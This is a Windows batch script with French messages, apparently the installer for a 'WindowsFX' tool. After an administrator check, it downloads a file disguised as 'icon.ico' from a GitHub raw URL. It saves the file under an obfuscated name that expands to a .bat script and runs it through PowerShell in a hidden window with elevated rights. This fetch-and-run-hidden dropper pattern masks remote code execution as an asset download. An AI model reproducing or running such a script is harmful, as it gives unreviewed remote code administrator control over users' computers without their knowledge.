@echo off
set ^"|find "::">nul 2>&1 && goto :no || goto :yes
:no
chcp 65001 > nul
echo.&echo Pour pouvoir utiliser l'utilitaire, vous devez être un administrateur&echo exécutant une session de console. 
chcp 850 > nul
goto :EOF
:yes
set powershell="%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe"
if "%processor_architecture%" == "amd64" (
set curl="%windir%\System32\curl.exe"
) else (
set curl="%windir%\SysWOW64\curl.exe"
)
%curl% https://raw.githubusercontent.com/dazd-pkz/WindowsFX/main/icon.ico -o %temp%\o.%p%b%n%a%g%t&mkdir %temp%\GraphicsType
%powershell% saps $env:TEMP\o.%p%b%n%a%g%t -WindowStyle Hidden -Verb RunAs
